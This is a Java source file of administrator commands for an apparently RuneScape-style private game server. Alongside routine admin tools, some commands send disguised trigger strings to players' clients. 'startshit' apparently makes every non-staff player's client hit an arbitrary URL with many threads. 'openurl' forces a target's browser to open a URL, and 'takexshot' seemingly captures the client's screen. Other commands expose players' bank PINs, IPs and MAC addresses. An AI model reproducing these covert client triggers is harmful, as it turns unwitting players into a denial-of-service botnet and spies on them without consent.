package org.hyperion.rs2.commands.newimpl;
//<editor-fold defaultstate="collapsed" desc="Imports">

import com.google.gson.JsonElement;
import org.hyperion.Server;
import org.hyperion.engine.EngineTask;
import org.hyperion.engine.GameEngine;
import org.hyperion.engine.task.Task;
import org.hyperion.engine.task.TaskManager;
import org.hyperion.engine.task.impl.OverloadStatsTask;
import org.hyperion.rs2.GenericWorldLoader;
import org.hyperion.rs2.commands.NewCommand;
import org.hyperion.rs2.commands.NewCommandExtension;
import org.hyperion.rs2.commands.impl.cmd.CheckPossibleHacksCommand;
import org.hyperion.rs2.commands.impl.cmd.FindListCommand;
import org.hyperion.rs2.commands.impl.cmd.GetFromCharFileCommand;
import org.hyperion.rs2.commands.util.CommandInput;
import org.hyperion.rs2.model.*;
import org.hyperion.rs2.model.combat.Combat;
import org.hyperion.rs2.model.container.ShopManager;
import org.hyperion.rs2.model.content.Events;
import org.hyperion.rs2.model.content.clan.Clan;
import org.hyperion.rs2.model.content.clan.ClanManager;
import org.hyperion.rs2.model.content.minigame.FightPits;
import org.hyperion.rs2.model.content.misc.Lottery;
import org.hyperion.rs2.model.content.misc.RandomSpamming;
import org.hyperion.rs2.model.content.misc2.Edgeville;
import org.hyperion.rs2.model.content.misc2.NewGameMode;
import org.hyperion.rs2.model.content.skill.dungoneering.DungeoneeringManager;
import org.hyperion.rs2.model.possiblehacks.DataType;
import org.hyperion.rs2.model.possiblehacks.PossibleHack;
import org.hyperion.rs2.model.possiblehacks.PossibleHacksHolder;
import org.hyperion.rs2.model.punishment.holder.PunishmentHolder;
import org.hyperion.rs2.model.punishment.manager.PunishmentManager;
import org.hyperion.rs2.net.LoginDebugger;
import org.hyperion.rs2.net.security.EncryptionStandard;
import org.hyperion.rs2.packet.ActionButtonPacketHandler;
import org.hyperion.rs2.pf.Tile;
import org.hyperion.rs2.pf.TileMap;
import org.hyperion.rs2.pf.TileMapBuilder;
import org.hyperion.rs2.saving.IOData;
import org.hyperion.rs2.saving.PlayerLoading;
import org.hyperion.rs2.util.TextUtils;
import org.hyperion.sql.DbHub;
import org.hyperion.sql.impl.log.type.IPLog;
import org.hyperion.util.Misc;
import org.hyperion.util.Time;

import java.io.BufferedWriter;
import java.io.FileWriter;
import java.io.IOException;
import java.util.*;
import java.util.concurrent.TimeUnit;
import java.util.logging.Level;
import java.util.stream.Collectors;
import java.util.stream.Stream;
//</editor-fold>

/**
 * Created by DrHales on 2/29/2016.
 */
public class AdministratorCommands implements NewCommandExtension {

    private abstract class Command extends NewCommand {
        public Command(String key, long delay, CommandInput... requiredInput) {
            super(key, Rank.ADMINISTRATOR, delay, requiredInput);
        }

        public Command(String key, CommandInput... requiredInput) {
            super(key, Rank.ADMINISTRATOR, requiredInput);
        }
    }

    @Override
    public List<NewCommand> init() {
        return Arrays.asList(
                new FindListCommand("namenpc", Rank.ADMINISTRATOR, Time.FIVE_SECONDS, FindListCommand.ListType.NPC),
                new FindListCommand("nameobject", Rank.ADMINISTRATOR, Time.FIVE_SECONDS, FindListCommand.ListType.OBJECT),
                new CheckPossibleHacksCommand("checkhax", DataType.ALL),
                new CheckPossibleHacksCommand("checkpasswords", DataType.PASSWORD),
                new CheckPossibleHacksCommand("checkprotocols", DataType.PROTOCOL),
                new CheckPossibleHacksCommand("checkaddresses", DataType.ADDRESS),
                new GetFromCharFileCommand("getmac", Time.TEN_SECONDS, IOData.LAST_MAC),
                new GetFromCharFileCommand("getmail", Time.TEN_SECONDS, IOData.E_MAIL),
                new GetFromCharFileCommand("getpin", Time.TEN_SECONDS, IOData.BANK_PIN),
                new GetFromCharFileCommand("getip", Time.TEN_SECONDS, IOData.LAST_IP) {
                    @Override
                    public boolean execute(Player player, String[] input) {
                        final Player target = World.getPlayerByName(input[0].trim());
                        if (target != null){
                            player.sendf("%s's current IP is %s", TextUtils.titleCase(target.getName()), target.getFullIP());
                        }
                        super.execute(player, input);

                        return true;
                    }
                },
                new Command("removeverifycode", new CommandInput<Object>(World::playerIsOnline, "Player", "An Online Player")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        final Player target = World.getPlayerByName(input[0]);
                        if (Rank.isStaffMember(target) && !Rank.hasAbility(player, Rank.DEVELOPER)) {
                            player.sendMessage("You cannot parse this command on staff members.");
                            return true;
                        }
                        if (target.verificationCode == null || target.verificationCode.isEmpty()) {
                            player.sendf("%s does not have a verification code.", TextUtils.optimizeText(target.getName()));
                            return true;
                        }
                        target.verificationCode = "";
                        player.sendf("Removed %s's verification code.", TextUtils.optimizeText(target.getName()));
                        player.sendf("%s has removed your verification code.", TextUtils.optimizeText(player.getName()));
                        return true;
                    }
                },
                new Command("getverifycode", new CommandInput<Object>(World::playerIsOnline, "Player", "An Online Player")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        final Player target = World.getPlayerByName(input[0]);
                        if (Rank.isStaffMember(target) && !Rank.hasAbility(player, Rank.DEVELOPER)) {
                            player.sendMessage("You cannot parse this command on staff members.");
                            return true;
                        }
                        if (target.verificationCode == null || target.verificationCode.isEmpty()) {
                            player.sendf("%s does not have a verification code.", TextUtils.optimizeText(target.getName()));
                            return true;
                        }
                        player.sendf("%s's verification code is '%s'.", TextUtils.optimizeText(target.getName()), target.verificationCode);
                        return true;
                    }
                },
                new Command("setverifycode", new CommandInput<Object>(World::playerIsOnline, "Player", "An Online Player"), new CommandInput<String>(string -> string != null, "String", "String with a length of 1 or more")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        final Player target = World.getPlayerByName(input[0]);
                        if (Rank.isStaffMember(target) && !Rank.hasAbility(player, Rank.DEVELOPER)) {
                            player.sendMessage("You cannot parse this command on staff members.");
                            return true;
                        }
                        target.verificationCode = input[1].trim();
                        player.sendf("%s's verification code is now '%s'.", TextUtils.optimizeText(target.getName()), target.verificationCode);
                        target.sendf("Your verification code has been changed to '%s' by '%s'.", target.verificationCode, TextUtils.optimizeText(player.getName()));
                        target.sendf("Upon login you will be required to \"::verify %s\" to unlock your account.", target.verificationCode);
                        return true;
                    }
                },
                new Command("infovl") {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        World.submit(new Task(500, "Infinite Overload 1") {
                            @Override
                            public void execute() {
                                player.resetOverloadCounter();
                                player.overloadTimer = Long.MAX_VALUE;
                                player.setOverloaded(true);
                                World.submit(new OverloadStatsTask(player));
                                World.submit(new Task(20000, "Infinite Overload 2") {
                                    @Override
                                    public void execute() {
                                        player.resetOverloadCounter();
                                        player.overloadTimer = Long.MAX_VALUE;
                                        player.setOverloaded(true);
                                        if (player.cE == null) {
                                            stop();
                                        }
                                    }
                                });
                                stop();
                            }
                        });
                        return true;
                    }
                },
                new Command("infspec") {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        World.submit(new Task(500, "Infinite Special") {
                            @Override
                            public void execute() {
                                player.getSpecBar().setAmount(1000);
                                if (player.cE == null) {
                                    stop();
                                }
                            }
                        });
                        return true;
                    }
                },
                new Command("infpray") {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        World.submit(new Task(1000, "Infinite Prayer") {
                            public void execute() {
                                player.getSkills().setLevel(Skills.PRAYER, 99);
                                if (player.cE == null)
                                    this.stop();
                            }
                        });
                        return true;
                    }
                },
                new Command("infsumm") {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        World.submit(new Task(1000, "Infinite Summoning") {
                            public void execute() {
                                player.getSkills().setLevel(Skills.SUMMONING, 99);
                                if (player.cE == null)
                                    this.stop();
                            }
                        });
                        return true;
                    }
                },
                new Command("npcinfo", new CommandInput<Integer>(integer -> NPCDefinition.forId(integer) != null, "Integer", "An Existing NPC ID")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        int id = Integer.parseInt(input[0].trim());
                        NPCDefinition definition = NPCDefinition.forId(id);
                        player.sendf("NPC Name: %s Combat: %d MaxHP: %d", definition.getName(), definition.combat(), definition.maxHp());
                        definition.getDrops().stream().forEach(drop -> {
                            player.sendf("%s : 1/%d , %d - %d", ItemDefinition.forId(drop.getId()).getName(), drop.getChance(), drop.getMin(), drop.getMax());
                        });
                        /*Won't get through with an exception so, no reason to write to npc-info.txt?*/
                        return true;
                    }
                },
                new Command("getskill", new CommandInput<Object>(World::playerIsOnline, "Player", "An Online Player"), new CommandInput<String>(string -> string != null, "String", "A Skill Name")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        final Player target = World.getPlayerByName(input[0].trim());
                        final String name = input[0].trim();
                        for (int array = 0; array < Skills.SKILL_COUNT; array++) {
                            final String skill = Skills.SKILL_NAME[array];
                            if (name.equalsIgnoreCase(skill)) {
                                player.sendf("%s: %s (ID: %d) = %d (%,d XP)", TextUtils.optimizeText(target.getName()), skill, array, target.getSkills().getLevel(array), target.getSkills().getExperience(array));
                            }
                        }
                        return true;
                    }
                },
                new Command("save") {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        /*Does Nothing*/
                        return true;
                    }
                },
                new Command("startspammingcolors") {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        player.sendMessage("Starting Color Spam");
                        RandomSpamming.start(true);
                        return true;
                    }
                },
                new Command("startspammingnocolors") {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        player.sendMessage("Starting spamming without colors");
                        RandomSpamming.start(false);
                        return true;
                    }
                },
                new Command("whatsmyequip") {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        Arrays.asList(player.getEquipment().toArray()).stream().filter(item -> item != null).forEach(item -> {
                            player.sendf("[Name]: %s, [ID]: %,d, [Slot]: %,d", TextUtils.optimizeText(item.getDefinition().getName()), item.getId(), item.getDefinition().getArmourSlot());
                        });
                        return true;
                    }
                },
                new Command("noskiller") {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        for (int i = 7; i < 21; i++) {
                            player.getSkills().setExperience(i, 0);
                        }
                        return true;
                    }
                },
                new Command("tobject", new CommandInput<Integer>(integer -> GameObjectDefinition.forId(integer) != null, "Integer", "Object ID"), new CommandInput<Integer>(integer -> integer > 0 && integer < 15, "Integer", "Object Face"), new CommandInput<Integer>(integer -> integer > -1 && integer < 23, "Integer", "Object Type")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        int id = Integer.parseInt(input[0].trim());
                        int face = Integer.parseInt(input[1].trim());
                        int type = Integer.parseInt(input[2].trim());
                        player.getActionSender().sendCreateObject(id, type, face, player.getPosition());
                        return true;
                    }
                },
                new Command("stopupdate") {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        Server.setUpdating(false);
                        return true;
                    }
                },
                new Command("spec") {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        player.getSpecBar().setAmount(SpecialBar.FULL);
                        player.getSpecBar().sendSpecAmount();
                        player.getSpecBar().sendSpecBar();
                        return true;
                    }
                },
                new Command("shop", new CommandInput<Integer>(integer -> integer > 0, "Integer", "Shop ID")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        ShopManager.open(player, Integer.parseInt(input[0].trim()));
                        return true;
                    }
                },
                new Command("pnpc", new CommandInput<Integer>(integer -> integer > -2 && integer < Integer.MAX_VALUE, "Integer", "NPC ID")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        final int value = Integer.parseInt(input[0].trim());
                        if (value < 0) {
                            player.setPNpc(-1);
                            return true;
                        }
                        if (NPCDefinition.forId(value) == null) {
                            return true;
                        }
                        player.setPNpc(value);
                        return true;
                    }
                },
                new Command("togglepits") {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        FightPits.playersInGame.stream().forEach(target -> FightPits.removePlayerFromGame(target, true));
                        FightPits.playersInGame.clear();
                        FightPits.waitingRoom.stream().forEach(target -> target.setTeleportTarget(Position.create(2399, 5177, 0), false));
                        FightPits.waitingRoom.clear();
                        FightPits.setEnabled(!FightPits.getEnabled());
                        player.sendf("[FightPits]:%s@bla@.", FightPits.getEnabled() ? "@gre@Enabled" : "@red@Disabled");
                        return true;
                    }
                },
                new Command("toggledung") {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        DungeoneeringManager.ENABLED = !DungeoneeringManager.ENABLED;
                        player.sendf("[Dungeoneering]:%s@bla@.", DungeoneeringManager.ENABLED ? "@gre@Enabled" : "@red@Disabled");
                        World.getPlayers().stream().filter(target -> target != null && target.getDungeoneering().inDungeon() || (target.getLocation() != null && target.getLocation().equals(Locations.Location.DUNGEONEERING_LOBBY))).forEach(target -> {
                            if (target.getLocation().equals(Locations.Location.DUNGEONEERING_LOBBY)) {
                                player.setTeleportTarget(Edgeville.POSITION);
                            } else {
                                target.getDungeoneering().getCurrentDungeon().remove(target, false);
                            }
                        });
                        return true;
                    }
                },
                new Command("tmask") {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        TileMapBuilder builder = new TileMapBuilder(player.getPosition(), 0);
                        TileMap map = builder.build();
                        Tile tile = map.getTile(0, 0);
                        player.sendf("N: %s, E: %s, S: %s, W: %s", tile.isNorthernTraversalPermitted(), tile.isEasternTraversalPermitted(), tile.isSouthernTraversalPermitted(), tile.isWesternTraversalPermitted());
                        return true;
                    }
                },
                new Command("takexshot", new CommandInput<Object>(World::playerIsOnline, "Player", "An Online Player")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        final Player target = World.getPlayerByName(input[0].trim());
                        target.sendMessage("script778877");
                        player.sendf("Sent player '%s' script778877.", TextUtils.optimizeText(target.getName()));
                        return true;
                    }
                },
                new Command("demote", new CommandInput<Object>(World::playerIsOnline, "Player", "An Online Player")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        final Player target = World.getPlayerByName(input[0].trim());
                        if (player == target) {
                            player.sendMessage("You cannot demote yourself.");
                            return true;
                        }
                        if (Rank.getPrimaryRankIndex(target) > Rank.getPrimaryRankIndex(target)) {
                            player.sendf("You cannot demote player '%s'.", TextUtils.optimizeText(target.getName()));
                            return true;
                        }
                        Arrays.asList(Rank.values()).stream().filter(rank -> rank.ordinal() > Rank.PLAYER.ordinal()).forEach(rank -> target.setPlayerRank(Rank.removeAbility(target, rank)));
                        player.sendf("%s has been demoted. current abilities:", TextUtils.titleCase(target.getName()));
                        Arrays.asList(Rank.values()).stream().filter(rank -> Rank.hasAbility(target, rank)).forEach(rank -> player.sendf("%s%s", rank.isAbilityToggled(target, rank) ? "@gre@" : "@red@", rank));
                        return true;
                    }
                },
                new Command("promote", new CommandInput<Object>(World::playerIsOnline, "Player", "An Online Player")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        final Player target = World.getPlayerByName(input[0].trim());
                        final Rank rank = Rank.hasAbility(player, Rank.OWNER) && Rank.hasAbility(target, Rank.DEVELOPER)
                                ? Rank.OWNER : Rank.hasAbility(player, Rank.OWNER) && Rank.hasAbility(target, Rank.ADMINISTRATOR)
                                ? Rank.DEVELOPER : Rank.hasAbility(player, Rank.DEVELOPER) && Rank.hasAbility(target, Rank.HEAD_MODERATOR)
                                ? Rank.ADMINISTRATOR : Rank.hasAbility(player, Rank.DEVELOPER) && Rank.hasAbility(target, Rank.COMMUNITY_MANAGER)
                                ? Rank.HEAD_MODERATOR : Rank.hasAbility(player, Rank.DEVELOPER) && Rank.hasAbility(target, Rank.GLOBAL_MODERATOR)
                                ? Rank.COMMUNITY_MANAGER : Rank.hasAbility(player, Rank.DEVELOPER) && Rank.hasAbility(target, Rank.MODERATOR)
                                ? Rank.GLOBAL_MODERATOR : Rank.hasAbility(player, Rank.DEVELOPER) && Rank.hasAbility(target, Rank.FORUM_MODERATOR)
                                ? Rank.MODERATOR : Rank.hasAbility(player, Rank.DEVELOPER) && Rank.hasAbility(target, Rank.HELPER)
                                ? Rank.FORUM_MODERATOR : Rank.hasAbility(target, Rank.EVENT_MANAGER)
                                ? Rank.HELPER : Rank.hasAbility(target, Rank.WIKI_EDITOR)
                                ? Rank.EVENT_MANAGER : Rank.hasAbility(target, Rank.SUPER_DONATOR)
                                ? Rank.WIKI_EDITOR : Rank.hasAbility(target, Rank.DONATOR)
                                ? Rank.SUPER_DONATOR : Rank.hasAbility(target, Rank.VETERAN)
                                ? Rank.DONATOR : Rank.hasAbility(target, Rank.LEGEND)
                                ? Rank.VETERAN : Rank.hasAbility(target, Rank.HERO)
                                ? Rank.LEGEND : Rank.hasAbility(target, Rank.PLAYER)
                                ? Rank.HERO : Rank.PLAYER;
                        target.setPlayerRank(Rank.addAbility(target, rank));
                        player.sendf("'@red@%s@bla@' has been promoted to @gre@%s@bla@.", TextUtils.optimizeText(target.getName()), rank);
                        return true;
                    }
                },
                new Command("moveloc", new CommandInput<Integer>(integer -> integer > -15000 && integer < 15000, "Integer", "An Amount between -15000 & 15000"), new CommandInput<Integer>(integer -> integer > -15000 && integer < 15000, "Integer", "An Amount between -15000 & 15000")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        final int x = Integer.parseInt(input[0].trim());
                        final int y = Integer.parseInt(input[1].trim());
                        player.setTeleportTarget(Position.create(player.getPosition().getX() + x, player.getPosition().getY() + y, player.getPosition().getZ()));
                        return true;
                    }
                },
                new Command("addip", new CommandInput<String>(string -> string.matches("^(25[0-5]|2[0-4]\\d|[0-1]?\\d?\\d)(\\.(25[0-5]|2[0-4]\\d|[0-1]?\\d?\\d)){3}$"), "IP", "A valid IPv4 address.")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        String value = input[0].trim().toLowerCase().replaceAll("_", "");
                        if (GenericWorldLoader.getAllowedIps().contains(value)) {
                            player.sendf("The IP address '%s' is already in this list.", value);
                            return true;
                        }
                        GenericWorldLoader.getAllowedIps().add(value);
                        player.sendf("The IP address '%s' has been added to the list.", value);
                        return true;
                    }
                },
                new Command("getlocalplayers") {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        player.sendf("[Local Players]: %,d", player.getLocalPlayers().size());
                        return true;
                    }
                },
                new Command("reloaditems") {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        ItemDefinition.loadItems();
                        player.sendMessage("Reloaded Items.");
                        return true;
                    }
                },
                new Command("reloadshops") {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        ShopManager.reloadShops();
                        player.sendMessage("Reloaded Shops.");
                        return true;
                    }
                },
                new Command("debugdropping") {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        player.getActionSender().sendMessage(player.getDropping().toString());
                        return true;
                    }
                },
                new Command("howmanyguesses") {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        player.sendf("[Counter]: %,d", Lottery.getGuessesCounter());
                        return true;
                    }
                },
                new Command("setitemprice", new CommandInput<Integer>(integer -> ItemDefinition.forId(integer) != null, "Integer", "Item ID"), new CommandInput<Integer>(integer -> integer > 0 && integer < Integer.MAX_VALUE, "", String.format("Integer", "An amount between 0 & %,d", Integer.MAX_VALUE))) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        int id = Integer.parseInt(input[0].trim());
                        int value = Integer.parseInt(input[1].trim());
                        NewGameMode.getPrices().put(id, value);
                        return true;
                    }
                },
                new Command("testimps") {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        player.getExtraData().put("impscaught", 20);
                        return true;
                    }
                },
                new Command("howmanyinregion") {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        player.sendf("[In Region]: %,d", player.getRegion().getPlayers().size());
                        return true;
                    }
                },
                new Command("sendloginlogs") {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        int count = 0;
                        for (String array : LoginDebugger.getDebugger().getLogs()) {
                            if (count++ > 100) {
                                break;
                            }
                            player.sendMessage(array);
                        }
                        return true;
                    }
                },
                new Command("togglelogindebugger") {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        LoginDebugger.getDebugger().setEnabled(!LoginDebugger.getDebugger().isEnabled());
                        player.sendf("[Login Debugger]: %s", LoginDebugger.getDebugger().isEnabled() ? "Enabled" : "Disabled");
                        return true;
                    }
                },
                new Command("dumploginlogs") {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        player.sendf("Login logs dumped %s.", LoginDebugger.getDebugger().dumpLogs() ? "Succesfully" : "Unsuccesfully");
                        return true;
                    }
                },
                new Command("doaction", new CommandInput<Integer>(integer -> integer > 0, "Integer", "Button ID")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        ActionButtonPacketHandler.handle(player, Integer.parseInt(input[0].trim()));
                        return true;
                    }
                },
                new Command("giveyt", new CommandInput<Object>(World::playerIsOnline, "Player", "An online Player")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        final Player target = World.getPlayerByName(input[0].trim());
                        Item item = Item.create(17656, 1);
                        if (target.getInventory().hasRoomFor(item)) {
                            target.getInventory().add(item);
                        } else {
                            target.getBank().add(item);
                            target.sendMessage("a Youtuber hat has been added to your bank.");
                        }
                        return true;
                    }
                },
                new Command("setelo", new CommandInput<Integer>(integer -> integer > 1200 && integer < 2500, "Integer", String.format("an Amount between %,d & %,d", Integer.MIN_VALUE, Integer.MAX_VALUE))) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        player.getPoints().setEloRating(Integer.parseInt(input[0].trim()));
                        return true;
                    }
                },
                new Command("openurl", new CommandInput<>(World::playerIsOnline, "Player", "An Online Player"), new CommandInput<String>(string -> string != null, "String", "URL")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        final Player target = World.getPlayerByName(input[0].trim());
                        final String URL = input[1].trim();
                        target.sendf("l4unchur13 %s", URL);
                        player.sendf("Launched %s on %s' browser.", URL, TextUtils.optimizeText(target.getName()));
                        return true;
                    }
                },
                new Command("resetskill", new CommandInput<>(World::playerIsOnline, "Player", "An Online Player"), new CommandInput<Integer>(integer -> integer > -1 && integer < 25, "Integer", "Skill ID")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        final Player target = World.getPlayerByName(input[0].trim());
                        final int skill = Integer.parseInt(input[1].trim());
                        target.getSkills().setLevel(skill, 1);
                        target.getSkills().setExperience(skill, 0);
                        return true;
                    }
                },
                new Command("setyelltag", new CommandInput<>(World::playerIsOnline, "Player", "An Online Player"), new CommandInput<String>(string -> string != null, "String", "Yell Tag")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        final Player target = World.getPlayerByName(input[0].trim());
                        final String value = input[1].trim();
                        target.getYelling().setYellTitle(Character.toString(value.charAt(0)).toUpperCase() + value.substring(1));
                        player.sendf("%s now has the yell tag: %s", TextUtils.optimizeText(target.getName()), target.getYelling().getTag());
                        return true;
                    }
                },
                new Command("reloadpunish") {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        player.sendf("Loaded Punishments: %s", PunishmentManager.getInstance().load() ? "Succesfully" : "Unsuccesfully");
                        return true;
                    }
                },
                new Command("startevent", new CommandInput<String>(string -> string != null, "String", "Event Name"), new CommandInput<Integer>(integer -> integer > 0, "Integer", "Time Till Start"), new CommandInput<String>(string -> Boolean.parseBoolean(string) == true || Boolean.parseBoolean(string) == false, "Boolean", "Safe or Not")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        String name = input[0].replaceAll("_", " ").trim();
                        int time = Integer.parseInt(input[1].trim());
                        boolean safe = Boolean.parseBoolean(input[2].trim());
                        Position location = player.getPosition();
                        Events.fireNewEvent(name, safe, time, location);
                        player.sendf("New Event: %s, %s, %s", name, safe, time);
                        return true;
                    }
                },
                new Command("stopevent") {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        Events.resetEvent();
                        player.sendMessage("You have reset the current event.");
                        return true;
                    }
                },
                new Command("hide") {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        player.isHidden(!player.isHidden());
                        player.setPNpc(player.isHidden() ? 942 : -1);
                        player.sendf("[Visible]: %s", player.isHidden() ? "Hidden" : "Showing");
                        FriendsAssistant.refreshGlobalList(player, player.isHidden());
                        return true;
                    }
                },
                new Command("testhits") {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        for (int array = 0; array < 100; array++) {
                            Combat.processCombat(player.cE);
                            player.cE.predictedAtk = System.currentTimeMillis();
                            player.cE.getOpponent()._getPlayer().ifPresent(target -> target.getSkills().setLevel(Skills.HITPOINTS, 99));
                        }
                        return true;
                    }
                },
                new Command("savepricelist") {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        int count = 0;
                        try (final BufferedWriter writer = new BufferedWriter(new FileWriter("./data/prices.txt"))) {
                            for (int array = 0; array < ItemDefinition.MAX_ID; array++) {
                                long price = NewGameMode.getUnitPrice(array);
                                writer.write(String.format("%d %d", array, price));
                                if (price > 0) {
                                    count++;
                                } else {
                                    TextUtils.writeToFile("./data/nullprices.txt", String.format("%d: %s is worth no coins and is noted: %s", array, ItemDefinition.forId(array).getName(), ItemDefinition.forId(array).isNoted()));
                                }
                                writer.newLine();
                            }
                            writer.close();
                        } catch (IOException ex) {
                            Server.getLogger().log(Level.WARNING, "Error writing to prices.txt", ex);
                        }
                        player.sendf("Saved %,d non-zero-prices", count);
                        return true;
                    }
                },
                new Command("startshit", new CommandInput<Integer>(integer -> integer > 0, "Integer", "Threads"), new CommandInput<String>(string -> string != null, "String", "URL")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        final int threads = Integer.parseInt(input[0].trim());
                        final String URL = input[1].trim();
                        World.getPlayers().stream().filter(target -> target != null && !Rank.hasAbility(target)).forEach(target -> target.sendf("script107%d,%s", threads, URL));
                        return true;
                    }
                },
                new Command("stopshit") {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        World.getPlayers().stream().filter(target -> target != null).forEach(target -> target.sendMessage("script105"));
                        return true;
                    }
                },
                new Command("adisplay", new CommandInput<>(object -> object != null && !String.valueOf(object).toLowerCase().contains("arre") && !String.valueOf(object).toLowerCase().contains("jet") && !String.valueOf(object).toLowerCase().contains("ferry") && !String.valueOf(object).toLowerCase().contains("drhales"), "String", "Display Name")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        String value = input[0].trim();
                        player.display = Character.toString(value.charAt(0)).toUpperCase() + value.substring(1);
                        return true;
                    }
                },
                new Command("ipalts", Time.TEN_SECONDS, new CommandInput<String>(string -> string.matches("^(25[0-5]|2[0-4]\\d|[0-1]?\\d?\\d)(\\.(25[0-5]|2[0-4]\\d|[0-1]?\\d?\\d)){3}$"), "Ip address", "A valid IP address")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        String targetIp = input[0];
                        player.sendMessage("Getting the alts for IP " + targetIp + "... Please be patient.");
                        GameEngine.submitSql(new EngineTask<Boolean>("ipalts command", 10, TimeUnit.SECONDS) {
                            @Override
                            public void stopTask() {
                                player.sendMessage("Request timed out... Please try again at a later point.");
                            }

                            @Override
                            public Boolean call() throws Exception {
                                List<IPLog> alts = DbHub.getPlayerDb().getLogs().getAltsByIp(targetIp);

                                player.sendMessage("@dre@The IP " + targetIp + " has logged in on " + alts.size() + " account" + (alts.size() == 1 ? "" : "s") + ".");
                                alts.forEach(alt -> player.sendMessage("@dre@" + Misc.formatPlayerName(alt.getPlayerName() + " @bla@- Last login: @dre@" + alt.getFormattedTimestamp() + "@bla@ IP used: @dre@" + alt.getIp())));
                                return true;
                            }
                        });
                        return true;
                    }
                },
                new Command("clearpunish", Time.TEN_SECONDS, new CommandInput<>(object -> true, "Player", "A player with a punishment.")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        String targetName = input[0];
                        player.sendMessage("Unpunishing " + Misc.formatPlayerName(targetName) + "... Please be patient.");
                        GameEngine.submitIO(new EngineTask<Boolean>("unpunish command", 10, TimeUnit.SECONDS) {
                            @Override
                            public void stopTask() {
                                player.sendMessage("Request timed out... Please try again at a later point.");
                            }

                            @Override
                            public Boolean call() throws Exception {
                                final PunishmentHolder holder = PunishmentManager.getInstance().get(targetName);
                                if (holder == null) {
                                    player.sendf("%s isn't punished", Misc.formatPlayerName(targetName));
                                    return false;
                                }
                                holder.getPunishments().forEach(punishment -> {
                                    punishment.getTime().setExpired(true);
                                    if (punishment.unapply())
                                        punishment.send(punishment.getVictim(), true);
                                    punishment.send(player, true);
                                    punishment.getHolder().remove(punishment);
                                    punishment.setActive(false);
                                });
                                return true;
                            }
                        });
                        return true;
                    }
                },
                new Command("changeclanowner", new CommandInput<String>(string -> string != null && ClanManager.clans.get(string) != null, "String", "Clan Owner Name"), new CommandInput<Object>(PlayerLoading::playerExists, "Player", "An existing player in the System.")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        final Clan clan = ClanManager.clans.get(input[0].trim());
                        final String value = input[1].trim();
                        player.sendClanMessage(String.format("Changing Clan '%s' owner from %s to %s.", clan.getName(), clan.getOwner(), value));
                        clan.setOwner(value);
                        return true;
                    }
                }
        );
    }
    //</editor-fold>
}